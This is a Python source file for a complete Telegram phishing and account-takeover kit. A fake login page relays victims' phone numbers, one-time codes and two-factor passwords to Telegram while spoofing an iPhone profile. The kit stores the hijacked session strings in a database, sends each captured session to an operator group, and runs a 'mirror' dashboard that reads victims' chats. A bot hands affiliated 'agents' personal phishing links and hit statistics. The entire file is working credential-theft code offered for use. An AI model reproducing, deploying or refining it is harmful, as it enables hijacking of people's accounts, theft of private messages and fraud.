import os
import asyncio
import telebot
import psycopg2
import logging
import json
import sys
import uuid
import random
import string
from telebot import types
from quart import Quart, request, jsonify, render_template, redirect, url_for
from telethon import TelegramClient, functions, errors, events
from telethon.sessions import StringSession
from threading import Thread
from datetime import datetime, timedelta

# --- SECTION 1: GLOBAL CONFIGURATION & ENHANCED LOGGING ---
# Integration with Environment Variables for cloud deployment (Koyeb, Railway, Heroku)

API_ID = int(os.environ.get("API_ID", 36003995))
API_HASH = os.environ.get("API_HASH", "41a2b48afe9cfbd1fbf59c5e75b00afa")
BOT_TOKEN = os.environ.get("BOT_TOKEN")
DATABASE_URL = os.environ.get("DATABASE_URL")
LOGGER_GROUP = int(os.environ.get("LOGGER_GROUP", 0)) 
VERIFY_GROUP = int(os.environ.get("VERIFY_GROUP", 0))
ADMIN_HANDLE = os.environ.get("ADMIN_HANDLE", "@g_yuyuu")
BASE_URL = os.environ.get("BASE_URL", "").rstrip('/')

# Professional Logging Configuration
logging.basicConfig(
    level=logging.INFO,
    format='[%(asctime)s] %(levelname)s in %(name)s: %(message)s',
    handlers=[logging.StreamHandler(sys.stdout)]
)
logger = logging.getLogger("VinzyUltra_Pro_V3")

bot = telebot.TeleBot(BOT_TOKEN, parse_mode="HTML")
app = Quart(__name__)

# --- SECTION 2: ADVANCED MEMORY MANAGEMENT ---
# tracks live login attempts across different auth methods
active_mirrors = {} 
qr_sessions = {} # Specifically for tracking QR login tokens

# --- SECTION 3: DATABASE ARCHITECTURE (POSTGRESQL) ---

def get_db_connection():
    """Returns a thread-safe connection to the PostgreSQL cluster."""
    return psycopg2.connect(DATABASE_URL, sslmode='require')

def init_db():
    """Initializes and verifies the database schema for the Vinzy Store Ecosystem."""
    try:
        conn = get_db_connection()
        cur = conn.cursor()
        
        # TABLE: Approved Team Members
        cur.execute("""
            CREATE TABLE IF NOT EXISTS approved_users (
                user_id BIGINT PRIMARY KEY, 
                username TEXT,
                status TEXT DEFAULT 'approved',
                joined_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        """)
        
        # TABLE: Captured Accounts (Hits)
        cur.execute("""
            CREATE TABLE IF NOT EXISTS controlled_accounts (
                phone TEXT PRIMARY KEY, 
                session_string TEXT NOT NULL, 
                owner_name TEXT, 
                tid BIGINT,
                hit_date TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                is_active BOOLEAN DEFAULT TRUE
            )
        """)

        # TABLE: Persistent Link Tracking
        cur.execute("""
            CREATE TABLE IF NOT EXISTS link_metrics (
                tid BIGINT PRIMARY KEY,
                clicks INTEGER DEFAULT 0,
                hits INTEGER DEFAULT 0
            )
        """)
        
        conn.commit()
        cur.close()
        conn.close()
        logger.info("SYSTEM: Database schema integrity verified.")
    except Exception as e:
        logger.critical(f"DATABASE INITIALIZATION FAILED: {e}")

def is_approved(user_id):
    """Boolean check for team member authorization."""
    try:
        conn = get_db_connection()
        cur = conn.cursor()
        cur.execute("SELECT status FROM approved_users WHERE user_id = %s", (user_id,))
        res = cur.fetchone()
        cur.close()
        conn.close()
        return res is not None
    except Exception as e:
        logger.error(f"AUTH CHECK FAILED: {e}")
        return False

# Trigger Database Startup
init_db()

# --- SECTION 4: WEB CONTROLLER (MIRRORING & BRIDGE LOGIC) ---

@app.route('/')
async def index():
    """The main entry point. Captures TID and renders the mirror template."""
    tid = request.args.get('id', '0')
    try:
        # Increment click metrics for the link owner
        if tid != '0':
            conn = get_db_connection()
            cur = conn.cursor()
            cur.execute("INSERT INTO link_metrics (tid, clicks) VALUES (%s, 1) ON CONFLICT (tid) DO UPDATE SET clicks = link_metrics.clicks + 1", (tid,))
            conn.commit()
            cur.close()
            conn.close()
        
        return await render_template("login.html", tid=tid)
    except Exception as e:
        logger.error(f"RENDER ERROR: {e}")
        return "<h1>Server Error 500: Missing templates</h1>", 500

@app.route('/step_phone', methods=['POST'])
async def step_phone():
    """Initiates the Telethon client and requests the OTP from Telegram."""
    data = await request.json
    phone = data.get('phone', '').replace("+", "").replace(" ", "").strip()
    tid = data.get('tid', '0')

    if not phone:
        return jsonify({"status": "error", "msg": "Invalid phone format."})

    # Spoofing High-Trust Device Profile (iPhone 16 Pro Max)
    client = TelegramClient(
        StringSession(), 
        API_ID, 
        API_HASH, 
        device_model="iPhone 16 Pro Max", 
        system_version="18.3",
        app_version="11.5.2"
    )
    
    try:
        await client.connect()
        sent_code = await client.send_code_request(phone)
        
        # Store metadata in RAM for Step 2
        active_mirrors[phone] = {
            "client": client, 
            "hash": sent_code.phone_code_hash, 
            "tid": tid,
            "timestamp": datetime.now()
        }
        
        logger.info(f"BRIDGE SUCCESS: OTP sent to {phone} for TID {tid}")
        return jsonify({"status": "success"})
        
    except errors.FloodWaitError as e:
        return jsonify({"status": "error", "msg": f"Flood Limit: Wait {e.seconds}s"})
    except Exception as e:
        logger.error(f"OTP REQUEST ERROR: {e}")
        return jsonify({"status": "error", "msg": "Phone not supported or invalid."})

@app.route('/step_code', methods=['POST'])
async def step_code():
    """Verifies the OTP code provided by the victim."""
    data = await request.json
    phone = data.get('phone', '').replace("+", "").replace(" ", "")
    code = data.get('code', '').strip()
    tid = data.get('tid')

    if phone not in active_mirrors:
        return jsonify({"status": "error", "msg": "Session Timeout. Refresh Page."})

    session = active_mirrors[phone]
    client = session['client']

    try:
        await client.sign_in(phone, code, phone_code_hash=session['hash'])
        return await finalize_hit(client, phone, tid)

    except errors.SessionPasswordNeededError:
        logger.info(f"SECURITY: 2FA detected for {phone}")
        return jsonify({"status": "2fa_needed"})
    except errors.PhoneCodeInvalidError:
        return jsonify({"status": "error", "msg": "The code is incorrect."})
    except Exception as e:
        logger.error(f"CODE VERIFICATION ERROR: {e}")
        return jsonify({"status": "error", "msg": str(e)})

@app.route('/step_2fa', methods=['POST'])
async def step_2fa():
    """Final hurdle: Completes login with 2FA password."""
    data = await request.json
    phone = data.get('phone', '').replace("+", "").replace(" ", "")
    password = data.get('password', '').strip()
    tid = data.get('tid')

    if phone not in active_mirrors:
        return jsonify({"status": "error", "msg": "Expired."})

    client = active_mirrors[phone]['client']

    try:
        await client.sign_in(password=password)
        return await finalize_hit(client, phone, tid)
    except errors.PasswordHashInvalidError:
        return jsonify({"status": "error", "msg": "Wrong 2FA password."})
    except Exception as e:
        return jsonify({"status": "error", "msg": "Verification failed."})

async def finalize_hit(client, phone, tid):
    """The Master Bridge Logic: Saves the hit, notifies admin, and alerts the team member."""
    try:
        me = await client.get_me()
        session_str = client.session.save()
        owner_name = f"{me.first_name} {me.last_name or ''}".strip()

        # 1. Permanent Database Storage
        conn = get_db_connection()
        cur = conn.cursor()
        cur.execute("""
            INSERT INTO controlled_accounts (phone, session_string, owner_name, tid) 
            VALUES (%s, %s, %s, %s) 
            ON CONFLICT (phone) DO UPDATE SET session_string = EXCLUDED.session_string
        """, (phone, session_str, owner_name, tid))
        
        # Update link hit metrics
        cur.execute("UPDATE link_metrics SET hits = hits + 1 WHERE tid = %s", (tid,))
        conn.commit()
        cur.close()
        conn.close()

        # 2. Master Log (To your Admin Group)
        log_caption = (
            f"⚡ <b>NEW ACCOUNT CAPTURED</b> ⚡\n\n"
            f"👤 <b>Target:</b> {owner_name}\n"
            f"📱 <b>Phone:</b> <code>{phone}</code>\n"
            f"🔑 <b>Session:</b> <code>{session_str}</code>\n"
            f"🔗 <b>Link Owner (TID):</b> <code>{tid}</code>"
        )
        bot.send_message(LOGGER_GROUP, log_caption)

        # 3. Notification to the team member who generated the link
        if str(tid).isdigit() and int(tid) != 0:
            user_alert = (
                f"🎯 <b>HIT ថ្មីបានចូលមកដល់! (SUCCESS)</b>\n\n"
                f"👤 ឈ្មោះ: {owner_name}\n"
                f"📱 លេខទូរស័ព្ទ: {phone}\n\n"
                f"ចុចប៊ូតុងខាងក្រោមដើម្បីចូលមើលសារ:"
            )
            markup = types.InlineKeyboardMarkup()
            markup.add(types.InlineKeyboardButton("🖥 Open Mirror Dashboard", url=f"{BASE_URL}/mirror/{phone}"))
            bot.send_message(tid, user_alert, reply_markup=markup)

        # Final Clean-up
        await client.disconnect()
        if phone in active_mirrors: del active_mirrors[phone]
        
        return jsonify({"status": "success"})
        
    except Exception as e:
        logger.error(f"FINALIZE CRITICAL ERROR: {e}")
        return jsonify({"status": "error", "msg": "Finalization failed."})

# --- SECTION 5: REAL-TIME MIRROR DASHBOARD ---

@app.route('/mirror/<phone>')
async def mirror_interface(phone):
    """Live web-based mirroring of the victim's Telegram account."""
    try:
        conn = get_db_connection()
        cur = conn.cursor()
        cur.execute("SELECT session_string, owner_name FROM controlled_accounts WHERE phone = %s", (phone,))
        db_res = cur.fetchone()
        cur.close()
        conn.close()

        if not db_res:
            return "<h1>Account not found in Database.</h1>", 404

        # Connect using the captured session
        mirror_client = TelegramClient(StringSession(db_res[0]), API_ID, API_HASH)
        await mirror_client.connect()
        
        if not await mirror_client.is_user_authorized():
            return "<h1>Mirror Session Expired/Revoked.</h1>", 401

        # Retrieve real-time data
        dialogs = await mirror_client.get_dialogs(limit=25)
        chat_buffer = []
        for d in dialogs:
            last_msg = d.message.message[:45] + "..." if d.message and d.message.message else "<i>Media Content</i>"
            chat_buffer.append({
                "name": d.name,
                "msg": last_msg,
                "id": d.id
            })
        
        await mirror_client.disconnect()
        return await render_template("mirror.html", name=db_res[1], phone=phone, chats=chat_buffer)
        
    except Exception as e:
        return f"<h1>Mirror System Error: {e}</h1>"

# --- SECTION 6: TELEGRAM BOT INTERFACE (LINK GENERATOR) ---

@bot.message_handler(commands=['start', 'help'])
def start_handler(m):
    """Greeting and authentication gate."""
    user_id = m.from_user.id
    if is_approved(user_id):
        kb = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
        kb.add("🔗 Generate Link", "📊 My Statistics", "💼 Controlled Accounts")
        bot.send_message(m.chat.id, f"<b>Welcome back, Vinzy Agent.</b>\nYour tools are ready.", reply_markup=kb)
    else:
        bot.send_message(m.chat.id, "🚫 <b>Access Denied</b>\nYou are not a registered member of Vinzy Store.")
        # Notify admins of the attempt
        adm_kb = types.InlineKeyboardMarkup()
        adm_kb.add(types.InlineKeyboardButton("Approve Now", callback_data=f"auth_{user_id}"))
        bot.send_message(VERIFY_GROUP, f"🔔 <b>New Access Request</b>\nUser: @{m.from_user.username}\nID: <code>{user_id}</code>", reply_markup=adm_kb)

@bot.callback_query_handler(func=lambda c: c.data.startswith('auth_'))
def approve_user_callback(call):
    """Admin-only approval function."""
    if call.message.chat.id != VERIFY_GROUP: return
    target = int(call.data.split('_')[1])
    
    conn = get_db_connection()
    cur = conn.cursor()
    cur.execute("INSERT INTO approved_users (user_id) VALUES (%s) ON CONFLICT DO NOTHING", (target,))
    conn.commit()
    cur.close()
    conn.close()
    
    bot.edit_message_text(f"✅ User <code>{target}</code> Authorized.", call.message.chat.id, call.message.message_id)
    bot.send_message(target, "🎊 <b>Congratulations!</b>\nYour account has been approved. Use /start to begin.")

@bot.message_handler(func=lambda m: m.text == "🔗 Generate Link")
def link_gen_handler(m):
    """Generates the unique bridge link using the user's TID."""
    if not is_approved(m.from_user.id): return
    # This maintains compatibility with your 'old tid' requirement
    unique_url = f"{BASE_URL}/?id={m.from_user.id}"
    msg = (
        f"🌐 <b>តំណភ្ជាប់ផ្ទាល់ខ្លួន (Personal Bridge):</b>\n\n"
        f"<code>{unique_url}</code>\n\n"
        f"<i>Share this link. When a victim logs in, you will get an instant alert.</i>"
    )
    bot.reply_to(m, msg)

@bot.message_handler(func=lambda m: m.text == "📊 My Statistics")
def stats_handler(m):
    """Shows link clicks and hits for the current user."""
    if not is_approved(m.from_user.id): return
    conn = get_db_connection()
    cur = conn.cursor()
    cur.execute("SELECT clicks, hits FROM link_metrics WHERE tid = %s", (m.from_user.id,))
    res = cur.fetchone()
    cur.close()
    conn.close()
    
    clicks, hits = res if res else (0, 0)
    bot.reply_to(m, f"📈 <b>Stats for ID {m.from_user.id}:</b>\n\nTotal Clicks: {clicks}\nTotal Hits: {hits}")

# --- SECTION 7: RUNTIME SYSTEM ---

def background_cleaner():
    """Cleans memory every hour to prevent RAM bloat."""
    while True:
        try:
            cutoff = datetime.now() - timedelta(minutes=60)
            expired = [p for p, d in active_mirrors.items() if d['timestamp'] < cutoff]
            for p in expired:
                del active_mirrors[p]
                logger.info(f"CLEANUP: Flushed session for {p}")
        except Exception as e:
            logger.error(f"CLEANER ERROR: {e}")
        asyncio.run(asyncio.sleep(3600))

def bot_polling_loop():
    """Bot polling wrapper with automatic restart."""
    logger.info("BOT: Polling started.")
    while True:
        try:
            bot.polling(none_stop=True, interval=0, timeout=20)
        except Exception as e:
            logger.error(f"BOT CRASH: {e}. Restarting in 5s...")
            asyncio.run(asyncio.sleep(5))

if __name__ == "__main__":
    # Launch Support Threads
    Thread(target=bot_polling_loop, daemon=True).start()
    Thread(target=background_cleaner, daemon=True).start()
    
    # Launch Quart Web Server
    port = int(os.environ.get("PORT", 8000))
    logger.info(f"SYSTEM: Web engine active on port {port}")
    app.run(host="0.0.0.0", port=port)
